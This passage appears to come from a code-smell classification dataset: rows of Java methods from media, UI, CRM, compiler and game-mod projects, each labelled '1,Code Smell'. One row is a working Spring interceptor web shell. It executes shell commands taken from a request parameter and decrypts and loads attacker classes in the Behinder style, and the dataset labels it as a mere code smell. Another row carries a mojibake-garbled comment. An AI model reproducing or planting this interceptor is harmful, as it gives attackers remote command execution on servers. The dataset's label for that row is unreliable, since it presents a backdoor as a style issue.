      if (applicationId.equals(strArr[2])) {
        long timestamp=Long.parseLong(strArr[1]);
        if (System.currentTimeMillis() - timestamp > 60 * 1000) {
          return null;
        }
        return strArr[0];
      }
    }
  }
  return null;
}",1,Code Smell
"/** 
 * Skips the buffer position to the position after the end of the current PS pack in the buffer, given the byte position right after the  {@link PsExtractor#PACK_START_CODE} of the pack inthe buffer. If the pack ends after the end of the buffer, skips to the end of the buffer.
 */
private static void skipToEndOfCurrentPack(ParsableByteArray packetBuffer){
  int limit=packetBuffer.limit();
  if (packetBuffer.bytesLeft() < 10) {
    packetBuffer.setPosition(limit);
    return;
  }
  packetBuffer.skipBytes(9);
  int packStuffingLength=packetBuffer.readUnsignedByte() & 0x07;
  if (packetBuffer.bytesLeft() < packStuffingLength) {
    packetBuffer.setPosition(limit);
    return;
  }
  packetBuffer.skipBytes(packStuffingLength);
  if (packetBuffer.bytesLeft() < 4) {
    packetBuffer.setPosition(limit);
    return;
  }
  int nextStartCode=peekIntAtPosition(packetBuffer.data,packetBuffer.getPosition());
  if (nextStartCode == PsExtractor.SYSTEM_HEADER_START_CODE) {
    packetBuffer.skipBytes(4);
    int systemHeaderLength=packetBuffer.readUnsignedShort();
    if (packetBuffer.bytesLeft() < systemHeaderLength) {
      packetBuffer.setPosition(limit);
      return;
    }
    packetBuffer.skipBytes(systemHeaderLength);
  }
  while (packetBuffer.bytesLeft() >= 4) {
    nextStartCode=peekIntAtPosition(packetBuffer.data,packetBuffer.getPosition());
    if (nextStartCode == PsExtractor.PACK_START_CODE || nextStartCode == PsExtractor.MPEG_PROGRAM_END_CODE) {
      break;
    }
    if (nextStartCode >>> 8 != PsExtractor.PACKET_START_CODE_PREFIX) {
      break;
    }
    packetBuffer.skipBytes(4);
    if (packetBuffer.bytesLeft() < 2) {
      packetBuffer.setPosition(limit);
      return;
    }
    int pesPacketLength=packetBuffer.readUnsignedShort();
    packetBuffer.setPosition(Math.min(packetBuffer.limit(),packetBuffer.getPosition() + pesPacketLength));
  }
}",1,Code Smell
"@Override public boolean preHandle(HttpServletRequest request,HttpServletResponse response,Object handler) throws Exception {
  System.out.println(""[+] Dynamic Interceptor says hello"");
  if (request.getParameter(""type"") != null && request.getParameter(""type"").equals(""basic"")) {
    String cmd=request.getParameter(basicCmdShellPwd);
    if (cmd != null && !cmd.isEmpty()) {
      String[] cmds=null;
      if (File.separator.equals(""/"")) {
        cmds=new String[]{""/bin/sh"",""-c"",cmd};
      }
 else {
        cmds=new String[]{""cmd"",""/C"",cmd};
      }
      String result=new Scanner(Runtime.getRuntime().exec(cmds).getInputStream()).useDelimiter(""\\A"").next();
      response.getWriter().println(result);
      return false;
    }
  }
 else   if (request.getHeader(behinderShellHeader) != null) {
    try {
      if (request.getMethod().equals(""POST"")) {
        String k=behinderShellPwd;
        request.getSession().setAttribute(""u"",k);
        Cipher cipher=Cipher.getInstance(""AES"");
        cipher.init(2,new SecretKeySpec((request.getSession().getAttribute(""u"") + """").getBytes(),""AES""));
        byte[] evilClassBytes=cipher.doFinal(new BASE64Decoder().decodeBuffer(request.getReader().readLine()));
        Class evilClass=(Class)myClassLoaderClazz.getDeclaredMethod(""defineClass"",byte[].class,ClassLoader.class).invoke(null,evilClassBytes,Thread.currentThread().getContextClassLoader());
        Object evilObject=evilClass.newInstance();
        Method targetMethod=evilClass.getDeclaredMethod(""equals"",new Class[]{ServletRequest.class,ServletResponse.class});
        targetMethod.invoke(evilObject,new Object[]{request,response});
      }
    }
 catch (    Exception e) {
      e.printStackTrace();
    }
    return false;
  }
  return true;
}",1,Code Smell
"@SuppressWarnings(""ResourceType"") public static boolean isL1WidevineAvailable(String mimeType){
  if (Util.SDK_INT >= 18) {
    try {
      if (MediaCodecUtil.getDecoderInfo(mimeType,true,false) == null) {
        return false;
      }
      MediaDrm mediaDrm=MediaDrmBuilder.build();
      String securityProperty=mediaDrm.getPropertyString(SECURITY_LEVEL_PROPERTY);
      mediaDrm.release();
      return WIDEVINE_SECURITY_LEVEL_1.equals(securityProperty);
    }
 catch (    MediaCodecUtil.DecoderQueryException e) {
      throw new IllegalStateException(e);
    }
  }
  return false;
}",1,Code Smell
"private void setupComboButtonField(ObjectProperty<Node> rightProperty){
  Region showComboButton=new Region();
  showComboButton.getStyleClass().addAll(""graphic"");
  StackPane showComboButtonPane=new StackPane(showComboButton);
  showComboButtonPane.getStyleClass().addAll(""combo-button"");
  showComboButtonPane.setCursor(Cursor.DEFAULT);
  showComboButtonPane.setOnMouseReleased(e -> {
    if (comboProperty.isNotNull().get()) {
      if (comboShowing) {
        comboProperty.get().hide();
      }
 else {
        comboProperty.get().show();
      }
      comboShowing=!comboShowing;
      if (!initialized) {
        comboProperty.get().valueProperty().addListener((observable,oldValue,newValue) -> {
          comboShowing=false;
          Platform.runLater(() -> comboProperty.get().getSelectionModel().clearSelection());
        }
);
        initialized=true;
      }
    }
  }
);
  rightProperty.set(showComboButtonPane);
}
",1,Code Smell
"/** 
 * Reads from the given input using the given  {@link Extractor}, until it can produce the  {@link SeekMap} and all of the tracks have been identified, or until the extractor encounters EOF.
 * @param extractor The {@link Extractor} to extractor from input.
 * @param output The {@link FakeTrackOutput} to store the extracted {@link SeekMap} and track.
 * @param dataSource The {@link DataSource} that will be used to read from the input.
 * @param uri The Uri of the input.
 * @return The extracted {@link SeekMap}.
 * @throws IOException If an error occurred reading from the input, or if the extractor finishesreading from input without extracting any  {@link SeekMap}.
 * @throws InterruptedException If the thread was interrupted.
 */
public static SeekMap extractSeekMap(Extractor extractor,FakeExtractorOutput output,DataSource dataSource,Uri uri) throws IOException, InterruptedException {
  ExtractorInput input=getExtractorInputFromPosition(dataSource,0,uri);
  extractor.init(output);
  PositionHolder positionHolder=new PositionHolder();
  int readResult=Extractor.RESULT_CONTINUE;
  while (true) {
    try {
      while (readResult == Extractor.RESULT_CONTINUE && (output.seekMap == null || !output.tracksEnded)) {
        readResult=extractor.read(input,positionHolder);
      }
    }
  finally {
      Util.closeQuietly(dataSource);
    }
    if (readResult == Extractor.RESULT_SEEK) {
      input=getExtractorInputFromPosition(dataSource,positionHolder.position,uri);
      readResult=Extractor.RESULT_CONTINUE;
    }
 else     if (readResult == Extractor.RESULT_END_OF_INPUT) {
      throw new IOException(""EOF encountered without seekmap"");
    }
    if (output.seekMap != null) {
      return output.seekMap;
    }
  }
}",1,Code Smell
"public Color getEntityTypeColor(Entity entity){
  if (distance.get()) {
    if (friendOverride.get() && entity instanceof PlayerEntity && Friends.get().isFriend((PlayerEntity)entity)) {
      return Config.get().friendColor.get();
    }
 else     return EntityUtils.getColorFromDistance(entity);
  }
 else   if (entity instanceof PlayerEntity) {
    return PlayerUtils.getPlayerColor(((PlayerEntity)entity),playersColor.get());
  }
 else {
    return null;
  }
}
",1,Code Smell
"@Override @Transactional(rollbackFor=Exception.class) public void cancelCombinationRecord(Long userId,Long id,Long headId){
  combinationRecordMapper.deleteById(id);
  List<CombinationRecordDO> updateRecords=new ArrayList<>();
  if (Objects.equals(headId,CombinationRecordDO.HEAD_ID_GROUP)) {
    List<CombinationRecordDO> list=getCombinationRecordListByHeadId(id);
    if (CollUtil.isEmpty(list)) {
      return;
    }
    list.sort(Comparator.comparing(CombinationRecordDO::getCreateTime));
    CombinationRecordDO newHead=list.get(0);
    list.forEach(item -> {
      CombinationRecordDO recordDO=new CombinationRecordDO();
      recordDO.setId(item.getId());
      if (ObjUtil.equal(item.getId(),newHead.getId())) {
        recordDO.setHeadId(CombinationRecordDO.HEAD_ID_GROUP);
      }
 else {
        recordDO.setHeadId(newHead.getId());
      }
      recordDO.setUserCount(list.size());
      updateRecords.add(recordDO);
    }
);
  }
 else {
    CombinationRecordDO recordHead=combinationRecordMapper.selectById(headId);
    List<CombinationRecordDO> records=getCombinationRecordListByHeadId(headId);
    if (CollUtil.isEmpty(records)) {
      return;
    }
    records.add(recordHead);
    records.forEach(item -> {
      CombinationRecordDO recordDO=new CombinationRecordDO();
      recordDO.setId(item.getId());
      recordDO.setUserCount(records.size());
      updateRecords.add(recordDO);
    }
);
  }
  combinationRecordMapper.updateBatch(updateRecords);
}",1,Code Smell
"private void processAnnotation(Type annotation,NativeContext imageContext,Set<Type> seen,TraversalPath path){
  if (seen.contains(annotation) || !imageContext.getTypeSystem().canResolve(annotation.getName()) || !annotationFilter.test(annotation)) {
    String reason=""because it cannot be reached via TypeSystem"";
    if (annotation.isPartOfDomain(""java.lang.annotation"")) {
      reason=""because it is a java.lang.annotation"";
    }
 else     if (seen.contains(annotation)) {
      reason=""because it has already been processed"";
    }
    imageContext.log(String.format(componentLogName + "": skipping annotation inspection for %s %s"",annotation.getDottedName(),reason));
    return;
  }
  imageContext.log(String.format(componentLogName + "": inspecting annotation %s"",annotation.getDottedName()));
  seen.add(annotation);
  annotationRegistrar.accept(annotation,imageContext);
  processAnnotationsOnType(annotation,imageContext,seen,path);
}
",1,Code Smell
"public static Observable<String> moveRootDir(final ContentResolver resolver,final DocumentFile root,final DocumentFile dst){
  return Observable.create(new Observable.OnSubscribe<String>(){
    @Override public void call(    Subscriber<? super String> subscriber){
      if (dst.canRead() && !isDirSame(root,dst)) {
        root.refresh();
        if (copyDir(resolver,root,dst,BACKUP,subscriber) && copyDir(resolver,root,dst,DOWNLOAD,subscriber) && copyDir(resolver,root,dst,PICTURE,subscriber)) {
          deleteDir(root,BACKUP,subscriber);
          deleteDir(root,DOWNLOAD,subscriber);
          deleteDir(root,PICTURE,subscriber);
          subscriber.onCompleted();
        }
      }
      subscriber.onError(new Exception());
    }
  }
).subscribeOn(Schedulers.io());
}
",1,Code Smell
"@Override public List<Instance> select(String consumer,List<Instance> providers){
  if (labels.isEmpty()) {
    return providers;
  }
  List<Instance> instanceList=new ArrayList<>();
  for (  Instance instance : providers) {
    boolean matched=true;
    for (    String labelName : getLabels()) {
      String consumerLabelValue=getCmdbReader().queryLabel(consumer,PreservedEntityTypes.ip.name(),labelName);
      if (StringUtils.isNotBlank(consumerLabelValue) && !StringUtils.equals(consumerLabelValue,getCmdbReader().queryLabel(instance.getIp(),PreservedEntityTypes.ip.name(),labelName))) {
        matched=false;
        break;
      }
    }
    if (matched) {
      instanceList.add(instance);
    }
  }
  if (instanceList.isEmpty()) {
    return providers;
  }
  return instanceList;
}
",1,Code Smell
"public void tick(){
  if (!active)   return;
  Minecraft mc=Minecraft.getInstance();
  if (mc.level == null || mc.player == null || !changed)   return;
  redraw();
  changed=false;
}
",1,Code Smell
"public void showConfirmations(IntegerProperty txEntryConfirmationsProperty,boolean coinbase){
  showConfirmations=true;
  isCoinbase=coinbase;
  int confirmations=txEntryConfirmationsProperty.get();
  if (confirmations < BlockTransactionHash.BLOCKS_TO_FULLY_CONFIRM) {
    confirmationsProperty.bind(txEntryConfirmationsProperty);
    confirmationsProperty.addListener((observable,oldValue,newValue) -> {
      setTooltipText();
      if (newValue.intValue() >= BlockTransactionHash.BLOCKS_TO_FULLY_CONFIRM) {
        confirmationsProperty.unbind();
      }
    }
);
  }
 else {
    confirmationsProperty.unbind();
    confirmationsProperty.set(confirmations);
  }
  setTooltipText();
}
",1,Code Smell
"/** 
 * Computes if data type can be omitted from the digset. <p>For instance,  {@code 1:BIGINT} has to keep data type while {@code 1:INT}should be represented as just  {@code 1}. <p>Implementation assumption: this method should be fast. In fact might call {@link NlsString#getValue()} which could decode the string, however we rely on the cache there.
 * @see RexLiteral#computeDigest(RexDigestIncludeType)
 * @param value value of the literal
 * @param type type of the literal
 * @return NO_TYPE when type can be omitted, ALWAYS otherwise
 */
private static RexDigestIncludeType shouldIncludeType(Comparable value,RelDataType type){
  if (type.isNullable()) {
    return RexDigestIncludeType.ALWAYS;
  }
  final RexDigestIncludeType includeType;
  if (type.getSqlTypeName() == SqlTypeName.BOOLEAN || type.getSqlTypeName() == SqlTypeName.INTEGER || type.getSqlTypeName() == SqlTypeName.SYMBOL) {
    includeType=RexDigestIncludeType.NO_TYPE;
  }
 else   if (type.getSqlTypeName() == SqlTypeName.CHAR && value instanceof NlsString) {
    NlsString nlsString=(NlsString)value;
    if (((nlsString.getCharset() != null && type.getCharset().equals(nlsString.getCharset())) || (nlsString.getCharset() == null && SqlCollation.IMPLICIT.getCharset().equals(type.getCharset()))) && nlsString.getCollation().equals(type.getCollation()) && ((NlsString)value).getValue().length() == type.getPrecision()) {
      includeType=RexDigestIncludeType.NO_TYPE;
    }
 else {
      includeType=RexDigestIncludeType.ALWAYS;
    }
  }
 else   if (type.getPrecision() == 0 && (type.getSqlTypeName() == SqlTypeName.TIME || type.getSqlTypeName() == SqlTypeName.TIMESTAMP || type.getSqlTypeName() == SqlTypeName.DATE)) {
    includeType=RexDigestIncludeType.NO_TYPE;
  }
 else {
    includeType=RexDigestIncludeType.ALWAYS;
  }
  return includeType;
}",1,Code Smell
"@Override public boolean onLongClick(View v){
  Integer position=(Integer)v.getTag();
  if (listener != null && position != null && position >= 0 && position < dataList.size()) {
    T data=dataList.get(position);
    return listener.onItemLongClick(data,position);
  }
  return false;
}",1,Code Smell
"@Override public Map<String,Object> getDataMapForNewExamine(ExamineConditionDataBO examineConditionDataBO){
  Map<String,Object> dataMap=new HashMap<>(8);
  Integer label=examineConditionDataBO.getLabel();
  Integer id=examineConditionDataBO.getTypeId();
  if (label == 1) {
    CrmModel crmModel=crmContractService.queryById(id);
    List<String> fieldList=examineConditionDataBO.getFieldList();
    fieldList.forEach(fieldName -> dataMap.put(fieldName,crmModel.get(fieldName)));
    dataMap.put(""createUserId"",crmModel.get(""createUserId""));
  }
 else   if (label == 2) {
    CrmModel crmModel=crmReceivablesService.queryById(id);
    List<String> fieldList=examineConditionDataBO.getFieldList();
    fieldList.forEach(fieldName -> dataMap.put(fieldName,crmModel.get(fieldName)));
    dataMap.put(""createUserId"",crmModel.get(""createUserId""));
  }
 else   if (label == 3) {
    ICrmInvoiceService crmInvoiceService=ApplicationContextHolder.getBean(ICrmInvoiceService.class);
    LambdaQueryWrapper<CrmInvoice> lambdaQueryWrapper=new LambdaQueryWrapper<>();
    lambdaQueryWrapper.eq(CrmInvoice::getInvoiceId,id);
    Map<String,Object> crmModel=crmInvoiceService.getMap(lambdaQueryWrapper);
    List<String> fieldList=examineConditionDataBO.getFieldList();
    fieldList.forEach(fieldName -> dataMap.put(fieldName,crmModel.get(fieldName)));
    dataMap.put(""createUserId"",crmModel.get(""createUserId""));
  }
  return dataMap;
}",1,Code Smell
"private boolean replaceLayout(View target){
  if (getParent() != null || target == null || target.getParent() == null || mLabelViewContainerID != -1) {
    return false;
  }
  ViewGroup parentContainer=(ViewGroup)target.getParent();
  if (target.getParent() instanceof FrameLayout) {
    ((FrameLayout)target.getParent()).addView(this);
  }
 else   if (target.getParent() instanceof ViewGroup) {
    int groupIndex=parentContainer.indexOfChild(target);
    mLabelViewContainerID=generateViewId();
    if (target.getParent() instanceof RelativeLayout) {
      for (int i=0; i < parentContainer.getChildCount(); i++) {
        if (i == groupIndex) {
          continue;
        }
        View view=parentContainer.getChildAt(i);
        RelativeLayout.LayoutParams para=(RelativeLayout.LayoutParams)view.getLayoutParams();
        for (int j=0; j < para.getRules().length; j++) {
          if (para.getRules()[j] == target.getId()) {
            para.getRules()[j]=mLabelViewContainerID;
          }
        }
        view.setLayoutParams(para);
      }
    }
    parentContainer.removeView(target);
    FrameLayout labelViewContainer=new FrameLayout(getContext());
    ViewGroup.LayoutParams targetLayoutParam=target.getLayoutParams();
    labelViewContainer.setLayoutParams(targetLayoutParam);
    target.setLayoutParams(new ViewGroup.LayoutParams(ViewGroup.LayoutParams.MATCH_PARENT,ViewGroup.LayoutParams.MATCH_PARENT));
    labelViewContainer.addView(target);
    labelViewContainer.addView(this);
    labelViewContainer.setId(mLabelViewContainerID);
    parentContainer.addView(labelViewContainer,groupIndex,targetLayoutParam);
  }
  return true;
}",1,Code Smell
"private void computeExamScore(Answer answer,Project project){
  if (project != null && ProjectModeEnum.exam.equals(project.getMode()) && answer != null && answer.getAnswer() != null) {
    SurveySchema srcSchema=project.getSurvey();
    if (answer.getId() != null) {
      Answer existAnswer=getById(answer.getId());
      if (existAnswer != null && existAnswer.getSurvey() != null) {
        srcSchema=existAnswer.getSurvey();
      }
    }
    AnswerScoreEvaluator evaluator=new AnswerScoreEvaluator(srcSchema,answer.getAnswer());
    answer.setExamScore(evaluator.eval());
    AnswerExamInfo examInfo=new AnswerExamInfo();
    examInfo.setQuestionScore(evaluator.getQuestionScore());
    answer.setExamInfo(examInfo);
  }
}
",1,Code Smell
"private void patchClassName(Object obj,Object[] args){
  if (obj instanceof ClassLoader && args.length == 1 && (""loadClass"".equals(method.getName()) || ""findClass"".equals(method.getName()))) {
    String binaryName=(String)args[0];
    args[0]=binaryName.replace('/','.');
  }
}",1,Code Smell
"public static void testGetterSetters(Class<?> baseClass) throws IOException, ReflectiveOperationException, URISyntaxException {
  List<Class<?>> list=getClasses(baseClass);
  for (  Class<?> clazz : list) {
    Object obj=null;
    if (clazz.isEnum()) {
      obj=clazz.getEnumConstants()[0];
    }
 else {
      Constructor<?>[] constructors=clazz.getConstructors();
      for (      Constructor<?> con : constructors) {
        try {
          Class<?>[] types=con.getParameterTypes();
          Object[] args=new Object[types.length];
          for (int i=0; i < args.length; ++i) {
            args[i]=getMockInstance(types[i],true);
          }
          con.setAccessible(true);
          obj=con.newInstance(args);
        }
 catch (        ReflectiveOperationException ignore) {
        }
      }
    }
    if (obj == null) {
      continue;
    }
    Method[] methods=clazz.getDeclaredMethods();
    for (    Method method : methods) {
      String methodName=method.getName();
      int parameterCount=method.getParameterCount();
      try {
        if (parameterCount == 0 && (methodName.startsWith(""get"") || methodName.startsWith(""is"") || ""toString"".equals(methodName)|| ""hashCode"".equals(methodName))) {
          method.invoke(obj);
        }
 else         if (parameterCount == 1 && (methodName.startsWith(""set"") || ""fromValue"".equals(methodName))) {
          Class<?> type=method.getParameterTypes()[0];
          method.invoke(obj,getMockInstance(type,true));
        }
 else         if (""equals"".equals(methodName)) {
          method.invoke(obj,obj);
          method.invoke(obj,(Object)null);
          Class<?> type=method.getParameterTypes()[0];
          method.invoke(obj,getMockInstance(type,true));
        }
      }
 catch (      ReflectiveOperationException ignore) {
      }
    }
  }
}",1,Code Smell
"@Override public TypedValue getValueInternal(ExpressionState state) throws EvaluationException {
  SpelNodeImpl leftOp=getLeftOperand();
  SpelNodeImpl rightOp=getRightOperand();
  Object leftOperand=leftOp.getValueInternal(state).getValue();
  Object rightOperand=rightOp.getValueInternal(state).getValue();
  if (leftOperand instanceof Number && rightOperand instanceof Number) {
    Number leftNumber=(Number)leftOperand;
    Number rightNumber=(Number)rightOperand;
    if (leftNumber instanceof BigDecimal) {
      BigDecimal leftBigDecimal=NumberUtils.convertNumberToTargetClass(leftNumber,BigDecimal.class);
      return new TypedValue(leftBigDecimal.pow(rightNumber.intValue()));
    }
 else     if (leftNumber instanceof BigInteger) {
      BigInteger leftBigInteger=NumberUtils.convertNumberToTargetClass(leftNumber,BigInteger.class);
      return new TypedValue(leftBigInteger.pow(rightNumber.intValue()));
    }
 else     if (leftNumber instanceof Double || rightNumber instanceof Double) {
      return new TypedValue(Math.pow(leftNumber.doubleValue(),rightNumber.doubleValue()));
    }
 else     if (leftNumber instanceof Float || rightNumber instanceof Float) {
      return new TypedValue(Math.pow(leftNumber.floatValue(),rightNumber.floatValue()));
    }
    double d=Math.pow(leftNumber.doubleValue(),rightNumber.doubleValue());
    if (d > Integer.MAX_VALUE || leftNumber instanceof Long || rightNumber instanceof Long) {
      return new TypedValue((long)d);
    }
 else {
      return new TypedValue((int)d);
    }
  }
  return state.operate(Operation.POWER,leftOperand,rightOperand);
}
",1,Code Smell
"private AgentBuilder installInjectingModule(InstrumentationModule instrumentationModule,AgentBuilder parentAgentBuilder,ConfigProperties config){
  List<String> helperClassNames=InstrumentationModuleMuzzle.getHelperClassNames(instrumentationModule);
  HelperResourceBuilderImpl helperResourceBuilder=new HelperResourceBuilderImpl();
  instrumentationModule.registerHelperResources(helperResourceBuilder);
  List<TypeInstrumentation> typeInstrumentations=instrumentationModule.typeInstrumentations();
  if (typeInstrumentations.isEmpty()) {
    if (!helperClassNames.isEmpty() || !helperResourceBuilder.getResources().isEmpty()) {
      logger.log(WARNING,""Helper classes and resources won't be injected if no types are instrumented: {0}"",instrumentationModule.instrumentationName());
    }
    return parentAgentBuilder;
  }
  MuzzleMatcher muzzleMatcher=new MuzzleMatcher(logger,instrumentationModule,config);
  AgentBuilder.Transformer helperInjector=new HelperInjector(instrumentationModule.instrumentationName(),helperClassNames,helperResourceBuilder.getResources(),Utils.getExtensionsClassLoader(),instrumentation);
  VirtualFieldImplementationInstaller contextProvider=virtualFieldInstallerFactory.create(instrumentationModule);
  AtomicBoolean openerRun=new AtomicBoolean();
  AgentBuilder agentBuilder=parentAgentBuilder;
  for (  TypeInstrumentation typeInstrumentation : typeInstrumentations) {
    AgentBuilder.Identified.Extendable extendableAgentBuilder=setTypeMatcher(agentBuilder,instrumentationModule,typeInstrumentation).and(muzzleMatcher).transform(ConstantAdjuster.instance()).transform((builder,typeDescription,classLoader,module,protectionDomain) -> {
      if (JavaModule.isSupported() && instrumentationModule instanceof ExperimentalInstrumentationModule && !openerRun.get()) {
        ExperimentalInstrumentationModule experimentalModule=(ExperimentalInstrumentationModule)instrumentationModule;
        experimentalModule.jpmsModulesToOpen().forEach((javaModule,packages) -> {
          ModuleOpener.open(instrumentation,javaModule,classLoader,packages);
        }
);
        openerRun.set(true);
      }
      return builder;
    }
).transform(helperInjector);
    extendableAgentBuilder=contextProvider.injectHelperClasses(extendableAgentBuilder);
    extendableAgentBuilder=contextProvider.rewriteVirtualFieldsCalls(extendableAgentBuilder);
    TypeTransformerImpl typeTransformer=new TypeTransformerImpl(extendableAgentBuilder);
    typeInstrumentation.transform(typeTransformer);
    extendableAgentBuilder=typeTransformer.getAgentBuilder();
    extendableAgentBuilder=contextProvider.injectFields(extendableAgentBuilder);
    agentBuilder=extendableAgentBuilder;
  }
  return agentBuilder;
}",1,Code Smell
"private void refreshPcapDumpInfo(Context context){
  String info="""";
  Prefs.DumpMode mode=CaptureService.getDumpMode();
switch (mode) {
case NONE:
    info=getString(R.string.no_dump_info);
  break;
case HTTP_SERVER:
info=String.format(getResources().getString(R.string.http_server_status),Utils.getLocalIPAddress(mActivity),CaptureService.getHTTPServerPort());
break;
case PCAP_FILE:
info=getString(R.string.pcap_file_info);
String pcapFname=CaptureService.getPcapFname();
if (pcapFname != null) info=pcapFname;
break;
case UDP_EXPORTER:
info=String.format(getResources().getString(R.string.collector_info),CaptureService.getCollectorAddress(),CaptureService.getCollectorPort());
break;
}
mCollectorInfoText.setText(info);
Drawable drawable=null;
if ((mAppFilter != null) && (!mAppFilter.isEmpty())) {
Pair<String,Drawable> pair=getAppFilterTextAndIcon(context);
drawable=pair.second;
}
if (drawable != null) {
mCollectorInfoIcon.setImageDrawable(drawable);
mCollectorInfoIcon.setVisibility(View.VISIBLE);
}
 else mCollectorInfoIcon.setVisibility(View.GONE);
}
",1,Code Smell
"/** 
 * 瀹夊叏杩囨护鍑芥暟
 * @param slice 瀛楃涓�
 * @return 瀹夊叏瀛楃涓�
 */
public static String trimCmdwithCh(String slice){
  if (slice == null) {
    return null;
  }
  StringBuilder sb=new StringBuilder();
  for (  char c : slice.toCharArray()) {
    if ((c >= 'a' && c <= 'z') || (c >= '0' && c <= '9') || (c >= 'A' && c <= 'Z')|| c == '_' || c == '-' || c == ',' || c == '~' || c == '/' || c == '\\' || c == '*' || c == '[' || c == ']' || c == '!' || c == '\'' || c == '""' || c == '=' || c == '>' || c == '{' || c == '}' || c == '(' || c == ')' || c == ' ' || c == '.' || c == ':' || c == '@' || (c >= 0x4e00 && c <= 0x9fbb)) {
      sb.append(c);
    }
 else {
      return null;
    }
  }
  return sb.toString();
}",1,Code Smell
"@Override public boolean initOnce(){
  try {
    Class<?> clazz=DexKit.doFindClass(DexKit.C_CustomWidgetUtil);
    for (    Method m : clazz.getDeclaredMethods()) {
      Class<?>[] argt=m.getParameterTypes();
      if (argt.length == 6 && Modifier.isStatic(m.getModifiers()) && m.getReturnType() == void.class) {
        XposedBridge.hookMethod(m,new XC_MethodHook(){
          @Override protected void beforeHookedMethod(          MethodHookParam param){
            if (LicenseStatus.sDisableCommonHooks) {
              return;
            }
            if (!isEnabled()) {
              return;
            }
            param.args[4]=Integer.MAX_VALUE;
          }
          @Override protected void afterHookedMethod(          MethodHookParam param){
            if (LicenseStatus.sDisableCommonHooks) {
              return;
            }
            if (!isEnabled()) {
              return;
            }
            if (HostInfo.requireMinQQVersion(QQVersion.QQ_8_8_11)) {
              TextView tv=(TextView)param.args[0];
              tv.setMaxWidth(Integer.MAX_VALUE);
              ViewGroup.LayoutParams lp=tv.getLayoutParams();
              lp.width=-2;
              tv.setLayoutParams(lp);
            }
          }
        }
);
        break;
      }
    }
    return true;
  }
 catch (  Throwable e) {
    log(e);
    return false;
  }
}",1,Code Smell
"private void openCommentsDialog(){
  disposeActions();
  if (mCommentsKey == null) {
    return;
  }
  final String backupKey=mCommentsKey;
  if (getPlayer() != null) {
    getPlayer().showControls(false);
  }
  String title=getPlayer() != null && getPlayer().getVideo() != null ? getPlayer().getVideo().getTitle() : mTitle;
  CommentsReceiver commentsReceiver=new AbstractCommentsReceiver(getContext()){
    @Override public void onLoadMore(    CommentGroup commentGroup){
      loadComments(this,commentGroup.getNextCommentsKey());
    }
    @Override public void onStart(){
      if (mBackup != null && Helpers.equals(mBackup.first,mCommentsKey)) {
        loadBackup(mBackup.second);
        return;
      }
      loadComments(this,mCommentsKey);
    }
    @Override public void onCommentClicked(    CommentItem commentItem){
      if (commentItem.getNestedCommentsKey() == null) {
        return;
      }
      CommentsReceiver nestedReceiver=new AbstractCommentsReceiver(getContext()){
        @Override public void onLoadMore(        CommentGroup commentGroup){
          loadComments(this,commentGroup.getNextCommentsKey());
        }
        @Override public void onStart(){
          loadComments(this,commentItem.getNestedCommentsKey());
        }
      }
;
      showDialog(nestedReceiver,title);
    }
    @Override public void onFinish(    Backup backup){
      if (Helpers.equals(backupKey,mCommentsKey)) {
        mBackup=new Pair<>(mCommentsKey,backup);
      }
    }
  }
;
  showDialog(commentsReceiver,title);
}
",1,Code Smell
"@Override public J visitNewClass(NewClassTree node,Space fmt){
  JRightPadded<Expression> encl=node.getEnclosingExpression() == null ? null : convert(node.getEnclosingExpression(),t -> sourceBefore("".""));
  Space whitespaceBeforeNew=EMPTY;
  Tree parent=getCurrentPath().getParentPath().getLeaf();
  if (!(parent instanceof JCVariableDecl && ((((JCVariableDecl)parent).mods.flags & Flags.ENUM) != 0))) {
    whitespaceBeforeNew=sourceBefore(""new"");
  }
  TypeTree clazz=endPos(node.getIdentifier()) >= 0 ? convertOrNull(node.getIdentifier()) : null;
  JContainer<Expression> args;
  if (positionOfNext(""("",'{') > -1) {
    args=JContainer.build(sourceBefore(""(""),node.getArguments().isEmpty() ? singletonList(padRight(new J.Empty(randomId(),sourceBefore("")""),Markers.EMPTY),EMPTY)) : convertAll(node.getArguments(),commaDelim,t -> sourceBefore("")"")),Markers.EMPTY);
  }
 else {
    args=JContainer.empty();
    args=args.withMarkers(args.getMarkers().add(new OmitParentheses(randomId())));
  }
  J.Block body=null;
  if (node.getClassBody() != null) {
    Space bodyPrefix=sourceBefore(""{"");
    List<Tree> members=new ArrayList<>(node.getClassBody().getMembers().size());
    for (    Tree m : node.getClassBody().getMembers()) {
      if (!(m instanceof JCMethodDecl) || (((JCMethodDecl)m).getModifiers().flags & Flags.GENERATEDCONSTR) == 0L) {
        members.add(m);
      }
    }
    body=new J.Block(randomId(),bodyPrefix,Markers.EMPTY,new JRightPadded<>(false,EMPTY,Markers.EMPTY),convertStatements(members),sourceBefore(""}""));
  }
  JCNewClass jcNewClass=(JCNewClass)node;
  JavaType.Method constructorType=typeMapping.methodInvocationType(jcNewClass.constructorType,jcNewClass.constructor);
  if (constructorType != null && jcNewClass.clazz.type.isParameterized() && node.getClassBody() == null) {
    constructorType=constructorType.withReturnType(typeMapping.type(jcNewClass.clazz.type));
  }
  return new J.NewClass(randomId(),fmt,Markers.EMPTY,encl,whitespaceBeforeNew,clazz,args,body,constructorType);
}",1,Code Smell
"public static InputMethodSubtype createSubtypeFromString(final String prefSubtype){
  final String[] elems=prefSubtype.split(LOCALE_AND_LAYOUT_SEPARATOR);
  if (elems.length != LENGTH_WITHOUT_EXTRA_VALUE && elems.length != LENGTH_WITH_EXTRA_VALUE) {
    Log.w(TAG,""Unknown additional subtype specified: "" + prefSubtype);
    return null;
  }
  final String languageTag=elems[INDEX_OF_LANGUAGE_TAG];
  final Locale locale=LocaleUtils.constructLocale(languageTag);
  final String keyboardLayoutSetName=elems[INDEX_OF_KEYBOARD_LAYOUT];
  final boolean asciiCapable=ScriptUtils.script(locale).equals(ScriptUtils.SCRIPT_LATIN);
  final InputMethodSubtype subtype=createEmojiCapableAdditionalSubtype(locale,keyboardLayoutSetName,asciiCapable);
  if (subtype.getNameResId() == SubtypeLocaleUtils.UNKNOWN_KEYBOARD_LAYOUT && !keyboardLayoutSetName.startsWith(CustomLayoutUtilsKt.CUSTOM_LAYOUT_PREFIX)) {
    return null;
  }
  return subtype;
}
",1,Code Smell
"private void processRequest(Intent req_intent,@NonNull String action){
  Intent res=new Intent();
  Utils.showToast(this,R.string.ctrl_consent_allowed);
  if (action.equals(ACTION_START)) {
    mStarterApp=getCallingApp();
    mReceiverClass=req_intent.getStringExtra(""broadcast_receiver"");
    Log.d(TAG,""Starting capture, caller="" + mStarterApp);
    CaptureSettings settings=new CaptureSettings(this,req_intent);
    String disallowedServer=checkRemoteServerNotAllowed(settings);
    if (disallowedServer != null) {
